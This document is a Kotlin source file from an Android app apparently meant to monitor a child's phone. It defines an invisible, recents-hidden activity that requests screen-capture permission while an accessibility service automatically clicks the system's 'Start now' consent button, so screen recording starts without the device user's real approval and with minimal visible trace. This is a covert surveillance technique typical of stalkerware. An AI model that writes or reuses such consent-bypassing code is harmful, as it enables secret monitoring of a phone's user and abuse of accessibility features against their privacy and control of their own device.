package nexus.android.child.components.screen

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity

/**
 * TransparentMediaProjectionActivity - Invisible activity to trigger MediaProjection permission
 * 
 * DESIGN:
 * - Transparent theme (user sees minimal flash)
 * - Excluded from recents (no trace in app switcher)
 * - Single instance launch mode (prevents duplicates)
 * - Separate task affinity (isolated from main app)
 * 
 * FLOW:
 * 1. BackgroundService launches this activity with FLAG_ACTIVITY_NEW_TASK
 * 2. onCreate() immediately requests MediaProjection permission
 * 3. System shows permission dialog
 * 4. Accessibility service auto-clicks "Start now" button
 * 5. onActivityResult() receives result
 * 6. Broadcast result to BackgroundService
 * 7. finish() - activity disappears
 * 
 * USER EXPERIENCE:
 * - Brief transparent flash (1-2 seconds)
 * - Permission dialog appears and auto-clicks
 * - Activity closes immediately after
 * - Minimal footprint, similar to camera activation
 */
class TransparentMediaProjectionActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "TransparentMediaProj"
        private const val REQUEST_CODE_SCREEN_CAPTURE = 1001
        
        // Broadcast action for result
        const val ACTION_MEDIA_PROJECTION_RESULT = "nexus.android.child.MEDIA_PROJECTION_RESULT"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_SUCCESS = "success"
        
        /**
         * Launch this activity from service
         */
        fun launch(context: Context) {
            val intent = Intent(context, TransparentMediaProjectionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
            }
            context.startActivity(intent)
            Log.d(TAG, "🚀 Launching transparent activity for MediaProjection")
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        Log.d(TAG, "📱 Activity created - requesting MediaProjection permission")
        
        // Make activity transparent and minimal
        window.setBackgroundDrawableResource(android.R.color.transparent)
        setFinishOnTouchOutside(false)
        
        // Request MediaProjection permission immediately
        requestMediaProjection()
    }
    
    /**
     * Request MediaProjection permission
     */
    private fun requestMediaProjection() {
        try {
            // CRITICAL: Enable auto-click BEFORE launching permission dialog
            // This gates the accessibility service to only click on OUR dialog
            MediaProjectionAutoClickHelper.enableAutoClick()
            
            val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            
            startActivityForResult(captureIntent, REQUEST_CODE_SCREEN_CAPTURE)
            Log.d(TAG, "📋 MediaProjection permission dialog launched (auto-click enabled)")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to request MediaProjection", e)
            
            // Disable auto-click on error
            MediaProjectionAutoClickHelper.disableAutoClick()
            
            broadcastResult(false, Activity.RESULT_CANCELED, null)
            finish()
        }
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            // Disable auto-click now that we have result
            MediaProjectionAutoClickHelper.disableAutoClick()
            
            val success = resultCode == Activity.RESULT_OK && data != null
            
            if (success) {
                Log.d(TAG, "✅ MediaProjection permission granted")
            } else {
                Log.w(TAG, "❌ MediaProjection permission denied or cancelled")
            }
            
            // Broadcast result to BackgroundService
            broadcastResult(success, resultCode, data)
            
            // Close activity
            finish()
        }
    }
    
    /**
     * Broadcast result to BackgroundService
     */
    private fun broadcastResult(success: Boolean, resultCode: Int, data: Intent?) {
        val intent = Intent(ACTION_MEDIA_PROJECTION_RESULT).apply {
            putExtra(EXTRA_SUCCESS, success)
            putExtra(EXTRA_RESULT_CODE, resultCode)
            if (data != null) {
                putExtra(EXTRA_RESULT_DATA, data)
            }
            setPackage(packageName) // Restrict to our app only
        }
        
        sendBroadcast(intent)
        Log.d(TAG, "📡 Result broadcast sent (success=$success)")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Ensure auto-click is disabled when activity is destroyed
        MediaProjectionAutoClickHelper.disableAutoClick()
        
        Log.d(TAG, "💀 Activity destroyed")
    }
}
